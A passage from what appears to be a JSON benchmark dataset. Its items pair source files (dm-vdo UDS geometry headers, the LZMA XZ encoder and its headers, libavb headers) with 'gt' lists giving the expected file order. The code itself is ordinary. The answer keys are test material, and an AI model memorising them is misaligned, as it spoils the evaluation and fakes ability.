uds_get_volume_record_page(struct volume *volume, u32 chapter,\n\t\t\t\t\t    u32 page_number, u8 **data_ptr);\n\nint __must_check uds_get_volume_index_page(struct volume *volume, u32 chapter,\n\t\t\t\t\t   u32 page_number,\n\t\t\t\t\t   struct delta_index_page **page_ptr);\n\n#endif\n\n'vdo/utils/uds/geometry.h'\n:\n\n\n#ifndef UDS_INDEX_GEOMETRY_H\n#define UDS_INDEX_GEOMETRY_H\n\n#include \"indexer.h\"\n\n\n\nstruct index_geometry {\n\n\tsize_t bytes_per_page;\n\n\tu32 record_pages_per_chapter;\n\n\tu32 chapters_per_volume;\n\n\tu32 sparse_chapters_per_volume;\n\n\tu8 chapter_delta_list_bits;\n\n\tu64 remapped_virtual;\n\n\tu64 remapped_physical;\n\n\n\n\tu32 pages_per_volume;\n\n\tsize_t bytes_per_volume;\n\n\tu32 pages_per_chapter;\n\n\tu32 index_pages_per_chapter;\n\n\tu32 records_per_page;\n\n\tu32 records_per_chapter;\n\n\tu64 records_per_volume;\n\n\tu32 delta_lists_per_chapter;\n\n\tu32 chapter_mean_delta;\n\n\tu8 chapter_payload_bits;\n\n\tu8 chapter_address_bits;\n\n\tu32 dense_chapters_per_volume;\n};\n\nenum {\n\n\tBYTES_PER_RECORD = (UDS_RECORD_NAME_SIZE + UDS_RECORD_DATA_SIZE),\n\n\n\tDEFAULT_BYTES_PER_PAGE = 1024 * BYTES_PER_RECORD,\n\n\n\tDEFAULT_RECORDS_PER_PAGE = DEFAULT_BYTES_PER_PAGE / BYTES_PER_RECORD,\n\n\n\tDEFAULT_RECORD_PAGES_PER_CHAPTER = 256,\n\n\n\tSMALL_RECORD_PAGES_PER_CHAPTER = 64,\n\n\n\tDEFAULT_CHAPTERS_PER_VOLUME = 1024,\n\n\n\tDEFAULT_SPARSE_CHAPTERS_PER_VOLUME = 0,\n\n\n\tDEFAULT_CHAPTER_MEAN_DELTA_BITS = 16,\n\n\n\tDEFAULT_CHAPTER_DELTA_LIST_BITS = 12,\n\n\n\tSMALL_CHAPTER_DELTA_LIST_BITS = 10,\n\n\n\tHEADER_PAGES_PER_VOLUME = 1,\n};\n\nint __must_check uds_make_index_geometry(size_t bytes_per_page, u32 record_pages_per_chapter,\n\t\t\t\t\t u32 chapters_per_volume,\n\t\t\t\t\t u32 sparse_chapters_per_volume, u64 remapped_virtual,\n\t\t\t\t\t u64 remapped_physical,\n\t\t\t\t\t struct index_geometry **geometry_ptr);\n\nint __must_check uds_copy_index_geometry(struct index_geometry *source,\n\t\t\t\t\t struct index_geometry **geometry_ptr);\n\nvoid uds_free_index_geometry(struct index_geometry *geometry);\n\nu32 __must_check uds_map_to_physical_chapter(const struct index_geometry *geometry,\n\t\t\t\t\t     u64 virtual_chapter);\n\n\nstatic inline bool __must_check\nuds_is_reduced_index_geometry(const struct index_geometry *geometry)\n{\n\treturn !!(geometry->chapters_per_volume & 1);\n}\n\nstatic inline bool __must_check\nuds_is_sparse_index_geometry(const struct index_geometry *geometry)\n{\n\treturn geometry->sparse_chapters_per_volume > 0;\n}\n\nbool __must_check uds_has_sparse_chapters(const struct index_geometry *geometry,\n\t\t\t\t\t  u64 oldest_virtual_chapter,\n\t\t\t\t\t  u64 newest_virtual_chapter);\n\nbool __must_check uds_is_chapter_sparse(const struct index_geometry *geometry,\n\t\t\t\t\tu64 oldest_virtual_chapter,\n\t\t\t\t\tu64 newest_virtual_chapter,\n\t\t\t\t\tu64 virtual_chapter_number);\n\nu32 __must_check uds_chapters_to_expire(const struct index_geometry *geometry,\n\t\t\t\t\tu64 newest_chapter);\n\n#endif\n",
        "gt": [
            "'vdo/utils/uds/geometry.h'",
            "'vdo/utils/uds/volume.h'",
            "'vdo/utils/uds/open-chapter.h'",
            "'vdo/utils/uds/open-chapter.c'"
        ]
    },
    {
        "files": [
            "'TSF/src/lzma/XzEnc.c'",
            "'TSF/include/lzma/LzmaEnc.h'",
            "'TSF/include/lzma/Lzma2Enc.h'",
            "'TSF/include/lzma/XzEnc.h'"
        ],
        "content": "'TSF/src/lzma/XzEnc.c'\n:\n\n\n\n#include <lzma/Precomp.h>\n\n\n\n#include <stdlib.h>\n\n#include <string.h>\n\n\n\n#include <lzma/7zCrc.h>\n\n#include <lzma/Alloc.h>\n\n#include <lzma/Bra.h>\n\n#include <lzma/CpuArch.h>\n\n\n\n#ifdef USE_SUBBLOCK\n\n#include <lzma/Bcj3Enc.c>\n\n#include <lzma/SbFind.c>\n\n#include <lzma/SbEnc.c>\n\n#endif\n\n\n\n#include <lzma/XzEnc.h>\n\n\n\n#define XzBlock_ClearFlags(p)       (p)->flags = 0;\n\n#define XzBlock_SetNumFilters(p, n) (p)->flags |= ((n) - 1);\n\n#define XzBlock_SetHasPackSize(p)   (p)->flags |= XZ_BF_PACK_SIZE;\n\n#define XzBlock_SetHasUnpackSize(p) (p)->flags |= XZ_BF_UNPACK_SIZE;\n\n\n\nstatic SRes WriteBytes(ISeqOutStream *s, const void *buf, UInt32 size)\n\n{\n\n  return (s->Write(s, buf, size) == size) ? SZ_OK : SZ_ERROR_WRITE;\n\n}\n\n\n\nstatic SRes WriteBytesAndCrc(ISeqOutStream *s, const void *buf, UInt32 size, UInt32 *crc)\n\n{\n\n  *crc = CrcUpdate(*crc, buf, size);\n\n  return WriteBytes(s, buf, size);\n\n}\n\n\n\nstatic SRes Xz_WriteHeader(CXzStreamFlags f, ISeqOutStream *s)\n\n{\n\n  UInt32 crc;\n\n  Byte header[XZ_STREAM_HEADER_SIZE];\n\n  memcpy(header, XZ_SIG, XZ_SIG_SIZE);\n\n  header[XZ_SIG_SIZE] = (Byte)(f >> 8);\n\n  header[XZ_SIG_SIZE + 1] = (Byte)(f & 0xFF);\n\n  crc = CrcCalc(header + XZ_SIG_SIZE, XZ_STREAM_FLAGS_SIZE);\n\n  SetUi32(header + XZ_SIG_SIZE + XZ_STREAM_FLAGS_SIZE, crc);\n\n  return WriteBytes(s, header, XZ_STREAM_HEADER_SIZE);\n\n}\n\n\n\n\n\nstatic SRes XzBlock_WriteHeader(const CXzBlock *p, ISeqOutStream *s)\n\n{\n\n  Byte header[XZ_BLOCK_HEADER_SIZE_MAX];\n\n\n\n  unsigned pos = 1;\n\n  unsigned numFilters, i;\n\n  header[pos++] = p->flags;\n\n\n\n  if (XzBlock_HasPackSize(p)) pos += Xz_WriteVarInt(header + pos, p->packSize);\n\n  if (XzBlock_HasUnpackSize(p)) pos += Xz_WriteVarInt(header + pos, p->unpackSize);\n\n  numFilters = XzBlock_GetNumFilters(p);\n\n\n\n  for (i = 0; i < numFilters; i++)\n\n  {\n\n    const CXzFilter *f = &p->filters[i];\n\n    pos += Xz_WriteVarInt(header + pos, f->id);\n\n    pos += Xz_WriteVarInt(header + pos, f->propsSize);\n\n    memcpy(header + pos, f->props, f->propsSize);\n\n    pos += f->propsSize;\n\n  }\n\n\n\n  while ((pos & 3) != 0)\n\n    header[pos++] = 0;\n\n\n\n  header[0] = (Byte)(pos >> 2);\n\n  SetUi32(header + pos, CrcCalc(header, pos));\n\n  return WriteBytes(s, header, pos + 4);\n\n}\n\n\n\n\n\nstatic SRes Xz_WriteFooter(CXzStream *p, ISeqOutStream *s)\n\n{\n\n  Byte buf[32];\n\n  UInt64 globalPos;\n\n  {\n\n    UInt32 crc = CRC_INIT_VAL;\n\n    unsigned pos = 1 + Xz_WriteVarInt(buf + 1, p->numBlocks);\n\n    size_t i;\n\n\n\n    globalPos = pos;\n\n    buf[0] = 0;\n\n    RINOK(WriteBytesAndCrc(s, buf, pos, &crc));\n\n\n\n    for (i = 0; i < p->numBlocks; i++)\n\n    {\n\n      const CXzBlockSizes *block = &p->blocks[i];\n\n      pos = Xz_WriteVarInt(buf, block->totalSize);\n\n      pos += Xz_WriteVarInt(buf + pos, block->unpackSize);\n\n      globalPos += pos;\n\n      RINOK(WriteBytesAndCrc(s, buf, pos, &crc));\n\n    }\n\n\n\n    pos = ((unsigned)globalPos & 3);\n\n\n\n    if (pos != 0)\n\n    {\n\n      buf[0] = buf[1] = buf[2] = 0;\n\n      RINOK(WriteBytesAndCrc(s, buf, 4 - pos, &crc));\n\n      globalPos += 4 - pos;\n\n    }\n\n    {\n\n      SetUi32(buf, CRC_GET_DIGEST(crc));\n\n      RINOK(WriteBytes(s, buf, 4));\n\n      globalPos += 4;\n\n    }\n\n  }\n\n\n\n  {\n\n    UInt32 indexSize = (UInt32)((globalPos >> 2) - 1);\n\n    SetUi32(buf + 4, indexSize);\n\n    buf[8] = (Byte)(p->flags >> 8);\n\n    buf[9] = (Byte)(p->flags & 0xFF);\n\n    SetUi32(buf, CrcCalc(buf + 4, 6));\n\n    memcpy(buf + 10, XZ_FOOTER_SIG, XZ_FOOTER_SIG_SIZE);\n\n    return WriteBytes(s, buf, 12);\n\n  }\n\n}\n\n\n\n\n\nstatic SRes Xz_AddIndexRecord(CXzStream *p, UInt64 unpackSize, UInt64 totalSize, ISzAlloc *alloc)\n\n{\n\n  if (!p->blocks || p->numBlocksAllocated == p->numBlocks)\n\n  {\n\n    size_t num = p->numBlocks * 2 + 1;\n\n    size_t newSize = sizeof(CXzBlockSizes) * num;\n\n    CXzBlockSizes *blocks;\n\n    if (newSize / sizeof(CXzBlockSizes) != num)\n\n      return SZ_ERROR_MEM;\n\n    blocks = (CXzBlockSizes *)alloc->Alloc(alloc, newSize);\n\n    if (!blocks)\n\n      return SZ_ERROR_MEM;\n\n    if (p->numBlocks != 0)\n\n    {\n\n      memcpy(blocks, p->blocks, p->numBlocks * sizeof(CXzBlockSizes));\n\n      alloc->Free(alloc, p->blocks);\n\n    }\n\n    p->blocks = blocks;\n\n    p->numBlocksAllocated = num;\n\n  }\n\n  {\n\n    CXzBlockSizes *block = &p->blocks[p->numBlocks++];\n\n    block->unpackSize = unpackSize;\n\n    block->totalSize = totalSize;\n\n  }\n\n  return SZ_OK;\n\n}\n\n\n\n\n\n\n\n\n\ntypedef struct\n\n{\n\n  ISeqInStream p;\n\n  ISeqInStream *realStream;\n\n  UInt64 processed;\n\n  CXzCheck check;\n\n} CSeqCheckInStream;\n\n\n\nstatic void SeqCheckInStream_Init(CSeqCheckInStream *p, unsigned mode)\n\n{\n\n  p->processed = 0;\n\n  XzCheck_Init(&p->check, mode);\n\n}\n\n\n\nstatic void SeqCheckInStream_GetDigest(CSeqCheckInStream *p, Byte *digest)\n\n{\n\n  XzCheck_Final(&p->check, digest);\n\n}\n\n\n\nstatic SRes SeqCheckInStream_Read(void *pp, void *data, size_t *size)\n\n{\n\n  CSeqCheckInStream *p = (CSeqCheckInStream *)pp;\n\n  SRes res = p->realStream->Read(p->realStream, data, size);\n\n  XzCheck_Update(&p->check, data, *size);\n\n  p->processed += *size;\n\n  return res;\n\n}\n\n\n\n\n\n\n\n\n\ntypedef struct\n\n{\n\n  ISeqOutStream p;\n\n  ISeqOutStream *realStream;\n\n  UInt64 processed;\n\n} CSeqSizeOutStream;\n\n\n\nstatic size_t MyWrite(void *pp, const void *data, size_t size)\n\n{\n\n  CSeqSizeOutStream *p = (CSeqSizeOutStream *)pp;\n\n  size = p->realStream->Write(p->realStream, data, size);\n\n  p->processed += size;\n\n  return size;\n\n}\n\n\n\n\n\n\n\n\n\n#define FILTER_BUF_SIZE (1 << 20)\n\n\n\ntypedef struct\n\n{\n\n  ISeqInStream p;\n\n  ISeqInStream *realStream;\n\n  IStateCoder StateCoder;\n\n  Byte *buf;\n\n  size_t curPos;\n\n  size_t endPos;\n\n  int srcWasFinished;\n\n} CSeqInFilter;\n\n\n\nstatic SRes SeqInFilter_Read(void *pp, void *data, size_t *size)\n\n{\n\n  CSeqInFilter *p = (CSeqInFilter *)pp;\n\n  size_t sizeOriginal = *size;\n\n  if (sizeOriginal == 0)\n\n    return SZ_OK;\n\n  *size = 0;\n\n\n\n  for (;;)\n\n  {\n\n    if (!p->srcWasFinished && p->curPos == p->endPos)\n\n    {\n\n      p->curPos = 0;\n\n      p->endPos = FILTER_BUF_SIZE;\n\n      RINOK(p->realStream->Read(p->realStream, p->buf, &p->endPos));\n\n      if (p->endPos == 0)\n\n        p->srcWasFinished = 1;\n\n    }\n\n    {\n\n      SizeT srcLen = p->endPos - p->curPos;\n\n      int wasFinished;\n\n      SRes res;\n\n      *size = sizeOriginal;\n\n      res = p->StateCoder.Code(p->StateCoder.p, data, size, p->buf + p->curPos, &srcLen,\n\n        p->srcWasFinished, CODER_FINISH_ANY, &wasFinished);\n\n      p->curPos += srcLen;\n\n      if (*size != 0 || srcLen == 0 || res != 0)\n\n        return res;\n\n    }\n\n  }\n\n}\n\n\n\nstatic void SeqInFilter_Construct(CSeqInFilter *p)\n\n{\n\n  p->buf = NULL;\n\n  p->p.Read = SeqInFilter_Read;\n\n}\n\n\n\nstatic void SeqInFilter_Free(CSeqInFilter *p)\n\n{\n\n  if (p->buf)\n\n  {\n\n    g_Alloc.Free(&g_Alloc, p->buf);\n\n    p->buf = NULL;\n\n  }\n\n}\n\n\n\nSRes BraState_SetFromMethod(IStateCoder *p, UInt64 id, int encodeMode, ISzAlloc *alloc);\n\n\n\nstatic SRes SeqInFilter_Init(CSeqInFilter *p, const CXzFilter *props)\n\n{\n\n  if (!p->buf)\n\n  {\n\n    p->buf = g_Alloc.Alloc(&g_Alloc, FILTER_BUF_SIZE);\n\n    if (!p->buf)\n\n      return SZ_ERROR_MEM;\n\n  }\n\n  p->curPos = p->endPos = 0;\n\n  p->srcWasFinished = 0;\n\n  RINOK(BraState_SetFromMethod(&p->StateCoder, props->id, 1, &g_Alloc));\n\n  RINOK(p->StateCoder.SetProps(p->StateCoder.p, props->props, props->propsSize, &g_Alloc));\n\n  p->StateCoder.Init(p->StateCoder.p);\n\n  return SZ_OK;\n\n}\n\n\n\n\n\n\n\n\n\n#ifdef USE_SUBBLOCK\n\n\n\ntypedef struct\n\n{\n\n  ISeqInStream p;\n\n  ISeqInStream *inStream;\n\n  CSbEnc enc;\n\n} CSbEncInStream;\n\n\n\nstatic SRes SbEncInStream_Read(void *pp, void *data, size_t *size)\n\n{\n\n  CSbEncInStream *p = (CSbEncInStream *)pp;\n\n  size_t sizeOriginal = *size;\n\n  if (sizeOriginal == 0)\n\n    return S_OK;\n\n\n\n  for (;;)\n\n  {\n\n    if (p->enc.needRead && !p->enc.readWasFinished)\n\n    {\n\n      size_t processed = p->enc.needReadSizeMax;\n\n      RINOK(p->inStream->Read(p->inStream, p->enc.buf + p->enc.readPos, &processed));\n\n      p->enc.readPos += processed;\n\n      if (processed == 0)\n\n      {\n\n        p->enc.readWasFinished = True;\n\n        p->enc.isFinalFinished = True;\n\n      }\n\n      p->enc.needRead = False;\n\n    }\n\n\n\n    *size = sizeOriginal;\n\n    RINOK(SbEnc_Read(&p->enc, data, size));\n\n    if (*size != 0 || !p->enc.needRead)\n\n      return S_OK;\n\n  }\n\n}\n\n\n\nvoid SbEncInStream_Construct(CSbEncInStream *p, ISzAlloc *alloc)\n\n{\n\n  SbEnc_Construct(&p->enc, alloc);\n\n  p->p.Read = SbEncInStream_Read;\n\n}\n\n\n\nSRes SbEncInStream_Init(CSbEncInStream *p)\n\n{\n\n  return SbEnc_Init(&p->enc);\n\n}\n\n\n\nvoid SbEncInStream_Free(CSbEncInStream *p)\n\n{\n\n  SbEnc_Free(&p->enc);\n\n}\n\n\n\n#endif\n\n\n\n\n\ntypedef struct\n\n{\n\n  CLzma2EncHandle lzma2;\n\n  #ifdef USE_SUBBLOCK\n\n  CSbEncInStream sb;\n\n  #endif\n\n  CSeqInFilter filter;\n\n  ISzAlloc *alloc;\n\n  ISzAlloc *bigAlloc;\n\n} CLzma2WithFilters;\n\n\n\n\n\nstatic void Lzma2WithFilters_Construct(CLzma2WithFilters *p, ISzAlloc *alloc, ISzAlloc *bigAlloc)\n\n{\n\n  p->alloc = alloc;\n\n  p->bigAlloc = bigAlloc;\n\n  p->lzma2 = NULL;\n\n  #ifdef USE_SUBBLOCK\n\n  SbEncInStream_Construct(&p->sb, alloc);\n\n  #endif\n\n  SeqInFilter_Construct(&p->filter);\n\n}\n\n\n\nstatic SRes Lzma2WithFilters_Create(CLzma2WithFilters *p)\n\n{\n\n  p->lzma2 = Lzma2Enc_Create(p->alloc, p->bigAlloc);\n\n  if (!p->lzma2)\n\n    return SZ_ERROR_MEM;\n\n  return SZ_OK;\n\n}\n\n\n\nstatic void Lzma2WithFilters_Free(CLzma2WithFilters *p)\n\n{\n\n  SeqInFilter_Free(&p->filter);\n\n  #ifdef USE_SUBBLOCK\n\n  SbEncInStream_Free(&p->sb);\n\n  #endif\n\n  if (p->lzma2)\n\n  {\n\n    Lzma2Enc_Destroy(p->lzma2);\n\n    p->lzma2 = NULL;\n\n  }\n\n}\n\n\n\n\n\nvoid XzProps_Init(CXzProps *p)\n\n{\n\n  p->lzma2Props = NULL;\n\n  p->filterProps = NULL;\n\n  p->checkId = XZ_CHECK_CRC32;\n\n}\n\n\n\nvoid XzFilterProps_Init(CXzFilterProps *p)\n\n{\n\n  p->id = 0;\n\n  p->delta = 0;\n\n  p->ip = 0;\n\n  p->ipDefined = False;\n\n}\n\n\n\n\n\nstatic SRes Xz_Compress(CXzStream *xz, CLzma2WithFilters *lzmaf,\n\n    ISeqOutStream *outStream, ISeqInStream *inStream,\n\n    const CXzProps *props, ICompressProgress *progress)\n\n{\n\n  xz->flags = (Byte)props->checkId;\n\n\n\n  RINOK(Lzma2Enc_SetProps(lzmaf->lzma2, props->lzma2Props));\n\n  RINOK(Xz_WriteHeader(xz->flags, outStream));\n\n\n\n  {\n\n    CSeqCheckInStream checkInStream;\n\n    CSeqSizeOutStream seqSizeOutStream;\n\n    CXzBlock block;\n\n    unsigned filterIndex = 0;\n\n    CXzFilter *filter = NULL;\n\n    const CXzFilterProps *fp = props->filterProps;\n\n\n\n    XzBlock_ClearFlags(&block);\n\n    XzBlock_SetNumFilters(&block, 1 + (fp ? 1 : 0));\n\n\n\n    if (fp)\n\n    {\n\n      filter = &block.filters[filterIndex++];\n\n      filter->id = fp->id;\n\n      filter->propsSize = 0;\n\n\n\n      if (fp->id == XZ_ID_Delta)\n\n      {\n\n        filter->props[0] = (Byte)(fp->delta - 1);\n\n        filter->propsSize = 1;\n\n      }\n\n      else if (fp->ipDefined)\n\n      {\n\n        SetUi32(filter->props, fp->ip);\n\n        filter->propsSize = 4;\n\n      }\n\n    }\n\n\n\n    {\n\n      CXzFilter *f = &block.filters[filterIndex++];\n\n      f->id = XZ_ID_LZMA2;\n\n      f->propsSize = 1;\n\n      f->props[0] = Lzma2Enc_WriteProperties(lzmaf->lzma2);\n\n    }\n\n\n\n    seqSizeOutStream.p.Write = MyWrite;\n\n    seqSizeOutStream.realStream = outStream;\n\n    seqSizeOutStream.processed = 0;\n\n\n\n    RINOK(XzBlock_WriteHeader(&block, &seqSizeOutStream.p));\n\n\n\n    checkInStream.p.Read = SeqCheckInStream_Read;\n\n    checkInStream.realStream = inStream;\n\n    SeqCheckInStream_Init(&checkInStream, XzFlags_GetCheckType(xz->flags));\n\n\n\n    if (fp)\n\n    {\n\n      #ifdef USE_SUBBLOCK\n\n      if (fp->id == XZ_ID_Subblock)\n\n      {\n\n        lzmaf->sb.inStream = &checkInStream.p;\n\n        RINOK(SbEncInStream_Init(&lzmaf->sb));\n\n      }\n\n      else\n\n      #endif\n\n      {\n\n        lzmaf->filter.realStream = &checkInStream.p;\n\n        RINOK(SeqInFilter_Init(&lzmaf->filter, filter));\n\n      }\n\n    }\n\n\n\n    {\n\n      UInt64 packPos = seqSizeOutStream.processed;\n\n\n\n      SRes res = Lzma2Enc_Encode(lzmaf->lzma2, &seqSizeOutStream.p,\n\n          fp ?\n\n            #ifdef USE_SUBBLOCK\n\n            (fp->id == XZ_ID_Subblock) ? &lzmaf->sb.p:\n\n            #endif\n\n            &lzmaf->filter.p:\n\n            &checkInStream.p,\n\n          progress);\n\n\n\n      RINOK(res);\n\n      block.unpackSize = checkInStream.processed;\n\n      block.packSize = seqSizeOutStream.processed - packPos;\n\n    }\n\n\n\n    {\n\n      unsigned padSize = 0;\n\n      Byte buf[128];\n\n      while ((((unsigned)block.packSize + padSize) & 3) != 0)\n\n        buf[padSize++] = 0;\n\n      SeqCheckInStream_GetDigest(&checkInStream, buf + padSize);\n\n      RINOK(WriteBytes(&seqSizeOutStream.p, buf, padSize + XzFlags_GetCheckSize(xz->flags)));\n\n      RINOK(Xz_AddIndexRecord(xz, block.unpackSize, seqSizeOutStream.processed - padSize, &g_Alloc));\n\n    }\n\n  }\n\n  return Xz_WriteFooter(xz, outStream);\n\n}\n\n\n\n\n\nSRes Xz_Encode(ISeqOutStream *outStream, ISeqInStream *inStream,\n\n    const CXzProps *props, ICompressProgress *progress)\n\n{\n\n  SRes res;\n\n  CXzStream xz;\n\n  CLzma2WithFilters lzmaf;\n\n  Xz_Construct(&xz);\n\n  Lzma2WithFilters_Construct(&lzmaf, &g_Alloc, &g_BigAlloc);\n\n  res = Lzma2WithFilters_Create(&lzmaf);\n\n  if (res == SZ_OK)\n\n    res = Xz_Compress(&xz, &lzmaf, outStream, inStream, props, progress);\n\n  Lzma2WithFilters_Free(&lzmaf);\n\n  Xz_Free(&xz, &g_Alloc);\n\n  return res;\n\n}\n\n\n\n\n\nSRes Xz_EncodeEmpty(ISeqOutStream *outStream)\n\n{\n\n  SRes res;\n\n  CXzStream xz;\n\n  Xz_Construct(&xz);\n\n  res = Xz_WriteHeader(xz.flags, outStream);\n\n  if (res == SZ_OK)\n\n    res = Xz_WriteFooter(&xz, outStream);\n\n  Xz_Free(&xz, &g_Alloc);\n\n  return res;\n\n}\n\n\n'TSF/include/lzma/LzmaEnc.h'\n:\n\n\n\n#ifndef __LZMA_ENC_H\n\n#define __LZMA_ENC_H\n\n\n\n#include \"7zTypes.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\n#define LZMA_PROPS_SIZE 5\n\n\n\ntypedef struct _CLzmaEncProps\n\n{\n\n  int level;\n\n  UInt32 dictSize;\n\n  UInt64 reduceSize;\n\n  int lc;\n\n  int lp;\n\n  int pb;\n\n  int algo;\n\n  int fb;\n\n  int btMode;\n\n  int numHashBytes;\n\n  UInt32 mc;\n\n  unsigned writeEndMark;\n\n  int numThreads;\n\n} CLzmaEncProps;\n\n\n\nvoid LzmaEncProps_Init(CLzmaEncProps *p);\n\nvoid LzmaEncProps_Normalize(CLzmaEncProps *p);\n\nUInt32 LzmaEncProps_GetDictSize(const CLzmaEncProps *props2);\n\n\n\n\n\n\n\n\n\n\n\n\n\ntypedef void * CLzmaEncHandle;\n\n\n\nCLzmaEncHandle LzmaEnc_Create(ISzAlloc *alloc);\n\nvoid LzmaEnc_Destroy(CLzmaEncHandle p, ISzAlloc *alloc, ISzAlloc *allocBig);\n\nSRes LzmaEnc_SetProps(CLzmaEncHandle p, const CLzmaEncProps *props);\n\nSRes LzmaEnc_WriteProperties(CLzmaEncHandle p, Byte *properties, SizeT *size);\n\nSRes LzmaEnc_Encode(CLzmaEncHandle p, ISeqOutStream *outStream, ISeqInStream *inStream,\n\n    ICompressProgress *progress, ISzAlloc *alloc, ISzAlloc *allocBig);\n\nSRes LzmaEnc_MemEncode(CLzmaEncHandle p, Byte *dest, SizeT *destLen, const Byte *src, SizeT srcLen,\n\n    int writeEndMark, ICompressProgress *progress, ISzAlloc *alloc, ISzAlloc *allocBig);\n\n\n\n\n\n\n\n\n\n\n\nSRes LzmaEncode(Byte *dest, SizeT *destLen, const Byte *src, SizeT srcLen,\n\n    const CLzmaEncProps *props, Byte *propsEncoded, SizeT *propsSize, int writeEndMark,\n\n    ICompressProgress *progress, ISzAlloc *alloc, ISzAlloc *allocBig);\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n\n'TSF/include/lzma/Lzma2Enc.h'\n:\n\n\n\n#ifndef __LZMA2_ENC_H\n\n#define __LZMA2_ENC_H\n\n\n\n#include \"LzmaEnc.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\ntypedef struct\n\n{\n\n  CLzmaEncProps lzmaProps;\n\n  size_t blockSize;\n\n  int numBlockThreads;\n\n  int numTotalThreads;\n\n} CLzma2EncProps;\n\n\n\nvoid Lzma2EncProps_Init(CLzma2EncProps *p);\n\nvoid Lzma2EncProps_Normalize(CLzma2EncProps *p);\n\n\n\n\n\n\n\n\n\n\n\ntypedef void * CLzma2EncHandle;\n\n\n\nCLzma2EncHandle Lzma2Enc_Create(ISzAlloc *alloc, ISzAlloc *allocBig);\n\nvoid Lzma2Enc_Destroy(CLzma2EncHandle p);\n\nSRes Lzma2Enc_SetProps(CLzma2EncHandle p, const CLzma2EncProps *props);\n\nByte Lzma2Enc_WriteProperties(CLzma2EncHandle p);\n\nSRes Lzma2Enc_Encode(CLzma2EncHandle p,\n\n    ISeqOutStream *outStream, ISeqInStream *inStream, ICompressProgress *progress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n\n'TSF/include/lzma/XzEnc.h'\n:\n\n\n\n#ifndef __XZ_ENC_H\n\n#define __XZ_ENC_H\n\n\n\n#include \"Lzma2Enc.h\"\n\n\n\n#include \"Xz.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\ntypedef struct\n\n{\n\n  UInt32 id;\n\n  UInt32 delta;\n\n  UInt32 ip;\n\n  int ipDefined;\n\n} CXzFilterProps;\n\n\n\nvoid XzFilterProps_Init(CXzFilterProps *p);\n\n\n\ntypedef struct\n\n{\n\n  const CLzma2EncProps *lzma2Props;\n\n  const CXzFilterProps *filterProps;\n\n  unsigned checkId;\n\n} CXzProps;\n\n\n\nvoid XzProps_Init(CXzProps *p);\n\n\n\nSRes Xz_Encode(ISeqOutStream *outStream, ISeqInStream *inStream,\n\n    const CXzProps *props, ICompressProgress *progress);\n\n\n\nSRes Xz_EncodeEmpty(ISeqOutStream *outStream);\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n",
        "gt": [
            "'TSF/include/lzma/LzmaEnc.h'",
            "'TSF/include/lzma/Lzma2Enc.h'",
            "'TSF/include/lzma/XzEnc.h'",
            "'TSF/src/lzma/XzEnc.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_hash_descriptor.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_descriptor.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_hash_descriptor.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_HASH_DESCRIPTOR_H_\n#define AVB_HASH_DESCRIPTOR_H_\n\n#include \"avb_descriptor.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct AvbHashDescriptor {\n  AvbDescriptor parent_descriptor;\n  uint64_t image_size;\n  uint8_t hash_algorithm[32];\n  uint32_t partition_name_len;\n  uint32_t salt_len;\n  uint32_t digest_len;\n  uint8_t reserved[64];\n} AVB_ATTR_PACKED AvbHashDescriptor;\n\n\nbool avb_hash_descriptor_validate_and_byteswap(const AvbHashDescriptor* src,\n                                               AvbHashDescriptor* dest)\n    AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'\n:\n\n#ifndef LIBAVB_H_\n#define LIBAVB_H_\n\n\n\n#define AVB_INSIDE_LIBAVB_H\n#include \"avb_chain_partition_descriptor.h\"\n#include \"avb_crypto.h\"\n#include \"avb_descriptor.h\"\n#include \"avb_footer.h\"\n#include \"avb_hash_descriptor.h\"\n#include \"avb_hashtree_descriptor.h\"\n#include \"avb_kernel_cmdline_descriptor.h\"\n#include \"avb_ops.h\"\n#include \"avb_property_descriptor.h\"\n#include \"avb_sha.h\"\n#include \"avb_slot_verify.h\"\n#include \"avb_sysdeps.h\"\n#include \"avb_util.h\"\n#include \"avb_vbmeta_image.h\"\n#include \"avb_version.h\"\n#undef AVB_INSIDE_LIBAVB_H\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_descriptor.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_DESCRIPTOR_H_\n#define AVB_DESCRIPTOR_H_\n\n#include \"avb_sysdeps.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef enum {\n  AVB_DESCRIPTOR_TAG_PROPERTY,\n  AVB_DESCRIPTOR_TAG_HASHTREE,\n  AVB_DESCRIPTOR_TAG_HASH,\n  AVB_DESCRIPTOR_TAG_KERNEL_CMDLINE,\n  AVB_DESCRIPTOR_TAG_CHAIN_PARTITION,\n} AvbDescriptorTag;\n\n\ntypedef struct AvbDescriptor {\n  uint64_t tag;\n  uint64_t num_bytes_following;\n} AVB_ATTR_PACKED AvbDescriptor;\n\n\nbool avb_descriptor_validate_and_byteswap(\n    const AvbDescriptor* src, AvbDescriptor* dest) AVB_ATTR_WARN_UNUSED_RESULT;\n\n\ntypedef bool AvbDescriptorForeachFunc(const AvbDescriptor* descriptor,\n                                      void* user_data);\n\n\nbool 